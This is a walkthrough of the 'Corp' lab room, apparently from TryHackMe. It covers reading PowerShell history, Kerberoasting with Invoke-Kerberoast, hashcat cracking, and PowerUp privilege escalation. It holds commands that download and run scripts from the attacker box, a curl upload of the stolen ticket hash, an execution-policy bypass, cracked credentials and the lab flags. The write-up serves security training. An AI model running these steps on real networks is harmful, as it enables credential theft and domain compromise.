# Corp

Bypass Windows Applocker and escalate your privileges. Also covers examples of kerberoasting, evading AV, bypassing applocker and escalating your privileges on a Windows system.

---
## Task 1: Bypassing Applocker

- Applocker introduced in 2007
- Allows restriction by path, hash, publisher
- Windows Powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
- rdp in xfreerdp or remina, I tend to like xfreerdp
```
  xfreerdp /u:'corp\dark' /p:'_QuejVudId6' /v:<targetIP>
```
Answer: obtained straight from ConsoleHost_history.txt file

## Task 3: Kerberoasting

Non credentialed PowerShell method to enumerate Windows to extract all accounts in the SPN:
```
setspn -T medin -Q */*
```
Running it example results:
```
PS C:\Users\dark> setspn -T medin -Q */*

Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "medin", 0x00000051

Warning: No valid targets specified, reverting to current domain.

CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
    Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
    ldap/omega.corp.local/ForestDnsZones.corp.local
    ldap/omega.corp.local/DomainDnsZones.corp.local
    TERMSRV/OMEGA
    TERMSRV/omega.corp.local
    DNS/omega.corp.local
    GC/omega.corp.local/corp.local
    RestrictedKrbHost/omega.corp.local
    RestrictedKrbHost/OMEGA
    RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
    HOST/OMEGA/CORP
    HOST/omega.corp.local/CORP
    HOST/OMEGA
    HOST/omega.corp.local
    HOST/omega.corp.local/corp.local
    E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
    ldap/OMEGA/CORP
    ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
    ldap/omega.corp.local/CORP
    ldap/OMEGA
    ldap/omega.corp.local
    ldap/omega.corp.local/corp.local

CN=krbtgt,CN=Users,DC=corp,DC=local
    kadmin/changepw

CN=fela,CN=Users,DC=corp,DC=local
    HTTP/fela
    HOST/fela@corp.local
    HTTP/fela@corp.local

Existing SPN found!

PS C:\Users\dark>
```
Answer: User for existing SPN is fela

### Next use invoke-kerberoast and obtain a ticket:

First download the Invoke-Kerberoast.ps1 from either use wget, curl or just firefox browser.

```
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 ​‌
```
Then transfer from attackbox to target:
```
PS C:\users\dark\downloads> Invoke-WebRequest -Uri http://10.66.96.187/Invoke-Kerberoast.ps1 -OutFile Invoke-Kerberoast.ps1
PS C:\users\dark\downloads> dir


    Directory: C:\users\dark\downloads

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/11/2026   7:03 AM          46848 Invoke-Kerberoast.ps1
```
Then run, running the file and running the function are two different things.:
```
PS C:\Users\dark> . .\Invoke-Kerberoast.ps1
```
PowerShell executed the script file. The script's job is to create the function Invoke-Kerberoast and then exit. That's why you saw no output, the extra . (dot-sourcing) loaded the function into your current PowerShell session. 

Then proved it worked:
```
PS> Get-Command Invoke-Kerberoast
CommandType     Name
-----------     ----
Function        Invoke-Kerberoast
```
At that point the function existed in memory, so running the following produced the Kerberoast hash:
```
PS C:\Users\dark> invoke-Kerberoast

TicketByteHexStream  :
Hash                 : $krb5tgs$HTTP/fela:C0A2CB48F3039E24756B9EB0AED1B93A$F4D98B830385B74F767F67E7CD0ECAF4EB87A0C93ED3
                       A8517AAA967435F0DD90FC907DF1B7477BD7571856B7FBD7778931B7F71A6349590E954516E037102F0DB17DCFA5C993
                       69FBA4B1759B70A73FCCF73D6B37CB594CE48FAC642B41D37778A75797BCDF72E4DB9470F7FF3D2911012FBDD7F7D84E
                       82F3693F77F2A0E33C8FEA43A87BD927AA606D89397EB40F69C6F2078085716E8875CE3496F91D65653FBAE8F0870B91
                       DC26549F1312D4AFEF02D27A0856C4AAECFAF69550287906EC50569FA258696CAFCC63F5607CBAECA1955FA974C3E101
                       08244887135B54FE7E5AA0D267B9D745A61A470B660A546CC2582FFB0C066600876C399653F887779F2D6CB67B0E9556
                       D694B39B3280ED916E0377C27EF3BCCC078B3AD21D6DB9AEC9C2D525DDE46895D125D2EC2B22CD127DE42BD5ECCE286B
                       B699B114CC973141607B64C7730FBF00CBB4272C5F2150FB85257E0E10FC1314467F86D74B84DF5330BC76BD13B3A92E
                       8401C0CCCC042AB06BB372E52B1893A0C398100FDA6D9A6077EDF0543C64FA4950B91C623C26620C8064521523871582
                       30A0461F1F2B6B9C837D0A0AA44AD7B922E475DC406FB544EBE7AF7A715C5D66EEAED6463D0CA7ED14DB2E8951B09CE8
                       AD58702EB52243609B7DF2D5FD0B19E77AE5A58844C7A979D3610A1A4FD53996C56E150EDDD9F61908D2154C191CA03D
                       89DD199DAF59B0C8334FBDDDE6FF9314D22E238626946AF92EF1E5A2AA9484B5FF6A11F337897AB4D09E12C03DB81B70
                       A05ED59253CEC32433D1AD16103A7636CF5FE2B14A630D1E2EB8AC78334654F455B2A1A8D132D56C67DB0038CC9579BD
                       89B219B10DC10CF58E536ADF4729CC32476E18FA4757CF0F8246FE24211D63A5DAD3F590515B3CB146AB6F80655421C1
                       043A558054AD277139F30282049F83F7142791929BCD33E3040C4EBD40F13D069D36BE59E41E15BDA1F4930474F9941E
                       751F35AE46BA85FC62552666486EE29D0AC70B02905A3CEA530FD90A09434AB6F939A98B272DC65E67A5F422E581AF9A
                       D053D85A063C2E2374F6CDFF90EE5DF37C23C8E7A88F335C61356518FC393E7E5E124AD638E28D5A856A248224DEC803
                       20D12907EA2BE42E8274F1528ACB32A4D62B058CBB827C01968F5FF6EE6D137474542CD9813505AC0A69A6F191B3E16C
                       F71EBD081C57016F43D184672187FB6E136731BCF8C3BFEDC02D78DCEAB03C44F1E42B76D940FE297C47ACBB56592CA5
                       946ED69B9160924A24A17D19A751286DFF616606A0D71A90897AE3F185242BC59080E8387D9948A528E3A3E4121EC11C
                       5B402A0ABA85CF8A5C6ABBB71BDA32C30905FDD4A8CA4198A4AFEAFF43C8B0BDC61F6AB8C93CE6EB11D8126729CD016E
                       7AF423411F8BECEC8C300B
SamAccountName       : fela
DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
ServicePrincipalName : HTTP/fela
```
Save to File ToCrack.txt, and strip out dead space and returns:
```
# cat ToCrack.txt | tr -d '\n\r ' > Hash.txt
```
should be one line for hashcat use cat or wc to check:
```
# wc -l Hash.txt
1 Hash.txt
```


In case upload server not installed first two options impacket smb server easier if installed but not if not installed. So since was not went with easier option uploadserver:

```
root@ip-10-66-116-47:~# python3 -m uploadserver 80
/usr/local/pyenv/versions/3.8.20/bin/python3: No module named uploadserver

root@ip-10-66-116-47:~# pip3 install uploadserver
Collecting uploadserver
  Downloading uploadserver-5.2.2-py3-none-any.whl (20 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-5.2.2
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv

[notice] A new release of pip is available: 23.0.1 -> 25.0.1
[notice] To update, run: pip install --upgrade pip
```
Then run:
```
root@ip-10-66-116-47:~# python3 -m uploadserver 80
File upload available at /upload
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

10.66.129.99 - - [11/Oct/2026 08:13:30] [Uploaded] "ToCrack.txt" --> /root/ToCrack.txt
10.66.129.99 - - [11/Oct/2026 08:13:30] "POST /upload HTTP/1.1" 204 -
```
Upload file to attackbox:
```
PS C:\Users\dark> curl.exe -F "files=@C:\users\dark\ToCrack.txt" http://10.66.116.47/upload
PS C:\Users\dark>
```
Next crack given hashcat -m 13100 -​a 0 hash.txt wordlist --force

```
# hashcat -m 13100 -a 0 Hash.txt /usr/share/wordlists/rockyou.txt  --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-AMD EPYC 7571, 1410/2884 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553435 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106875 bytes (47.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660309 bytes (71.Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213745 bytes (95.Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 10 secs

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$HTTP/fela:c0a2cb48f3039e24756b9eb0aed1b93a$f4d98b830385b74f767f67e7cd0ecaf4eb87a0c93ed3a8517aaa967435f0dd90fc907df1b7477bd7571856b7fbd7778931b7f71a6349590e954516e037102f0db17dcfa5c99369fba4b1759b70a73fccf73d6b37cb594ce48fac642b41d37778a75797bcdf72e4db9470f7ff3d2911012fbdd7f7d84e82f3693f77f2a0e33c8fea43a87bd927aa606d89397eb40f69c6f2078085716e8875ce3496f91d65653fbae8f0870b91dc26549f1312d4afef02d27a0856c4aaecfaf69550287906ec50569fa258696cafcc63f5607cbaeca1955fa974c3e10108244887135b54fe7e5aa0d267b9d745a61a470b660a546cc2582ffb0c066600876c399653f887779f2d6cb67b0e9556d694b39b3280ed916e0377c27ef3bccc078b3ad21d6db9aec9c2d525dde46895d125d2ec2b22cd127de42bd5ecce286bb699b114cc973141607b64c7730fbf00cbb4272c5f2150fb85257e0e10fc1314467f86d74b84df5330bc76bd13b3a92e8401c0cccc042ab06bb372e52b1893a0c398100fda6d9a6077edf0543c64fa4950b91c623c26620c806452152387158230a0461f1f2b6b9c837d0a0aa44ad7b922e475dc406fb544ebe7af7a715c5d66eeaed6463d0ca7ed14db2e8951b09ce8ad58702eb52243609b7df2d5fd0b19e77ae5a58844c7a979d3610a1a4fd53996c56e150eddd9f61908d2154c191ca03d89dd199daf59b0c8334fbddde6ff9314d22e238626946af92ef1e5a2aa9484b5ff6a11f337897ab4d09e12c03db81b70a05ed59253cec32433d1ad16103a7636cf5fe2b14a630d1e2eb8ac78334654f455b2a1a8d132d56c67db0038cc9579bd89b219b10dc10cf58e536adf4729cc32476e18fa4757cf0f8246fe24211d63a5dad3f590515b3cb146ab6f80655421c1043a558054ad277139f30282049f83f7142791929bcd33e3040c4ebd40f13d069d36be59e41e15bda1f4930474f9941e751f35ae46ba85fc62552666486ee29d0ac70b02905a3cea530fd90a09434ab6f939a98b272dc65e67a5f422e581af9ad053d85a063c2e2374f6cdff90ee5df37c23c8e7a88f335c61356518fc393e7e5e124ad638e28d5a856a248224dec80320d12907ea2be42e8274f1528acb32a4d62b058cbb827c01968f5ff6ee6d137474542cd9813505ac0a69a6f191b3e16cf71ebd081c57016f43d184672187fb6e136731bcf8c3bfedc02d78dceab03c44f1e42b76d940fe297c47acbb56592ca5946ed69b9160924a24a17d19a751286dff616606a0d71a90897ae3f185242bc59080e8387d9948a528e3a3e4121ec11c5b402a0aba85cf8a5c6abbb71bda32c30905fdd4a8ca4198a4afeaff43c8b0bdc61f6ab8c93ce6eb11d8126729cd016e7af423411f8becec8c300b:rubenF124
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$HTTP/fela:c0a2cb48f3039e24756b9eb0aed1b93a...8c300b
Time.Started.....: Sun Oct 11 08:31:38 2026, (11 secs)
Time.Estimated...: Sun Oct 11 08:31:49 2026, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   377.5 kH/s (1.01ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4132864/14344384 (28.81%)
Rejected.........: 0/4132864 (0.00%)
Restore.Point....: 4132352/14344384 (28.81%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: rubens6 -> ruben5277
Hardware.Mon.#1..: Util: 60%

Started: Sun Oct 11 08:30:49 2026
Stopped: Sun Oct 11 08:31:50 2026
```
Then login with xfreerdp and on desktop is the file flag.txt:
```
# xfreerdp /p:'rubenF124' /u:'corp\fela' /v:<targetIP>
...
Do you trust the above certificate? (Y/T/N) y
...
```
Before this tried psexec the access the file but does not work unless it admin account:
```
psexec -u corp\fela -p password cmd
```

flag is flag{bde1642535aa396d2439d86fe54a36e4}

---
## Task 4: Privilege Escalation

**Download:**
```
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
```
**Set up simple server:**
```
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
**Upload file:**
```
PS C:\Users\dark> PS C:\Users\dark> iex(New-Object Net.WebClient).DownloadString('http://10.67.105.46:80/PowerUp.ps1')
```
**Set up bypass as execution policy**
```
PS C:\Users\dark> powershell -ep bypass
```
**Check with**
```
PS C:\Users\dark> get-executionpolicy
```
**Load the script into memory**
```
PS C:\Users\dark> . .\PowerUp.ps1
```
**After this command, functions such as:**
- Invoke-AllChecks
- Get-ServiceUnquoted
- Get-ModifiableServiceFile
```
PS C:\Users\dark> Invoke-AllChecks
ModifiablePath    : C:\Users\dark\AppData\Local\Microsoft\WindowsApps
IdentityReference : CORP\dark
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\dark\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\dark\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\dark\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend\Unattended.xml
Name         : C:\Windows\Panther\Unattend\Unattended.xml
Check        : Unattended Install Files
```

**C:\Windows\Panther\Unattend\Unattended.xml often contain Administrator password for installation of OS:**
```
PS C:\Users\dark> iex(New-Object Net.WebClient).DownloadString('http://10.67.105.46:80/PowerUp.ps1')
PS C:\Users\dark> type C:\Windows\Panther\Unattend\Unattended.xml
<AutoLogon>
    <Password>
        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>
```
**Easiest way to convert is base64 password is just copy to cyberchef.io, but directly in PowerShell, a couple of ways to convert are:**
```
PS > $b64="dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ="
PS > $bytes = [System.Convert]::FromBase64String($b64)
PS > $bytes  
 tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
```
**Or certutil has a decode option seems to take the so many options that need to be explored.** 

Here is two encode decode options that are useful here:
```
certutil -encode input.txt out.b64
certutil -decode in.b64 out.txt
```
**Then use to login and it requires password change, then flag is on desktop:**

Answer: THM{g00d_j0b_SYS4DM1n_M4s73R}


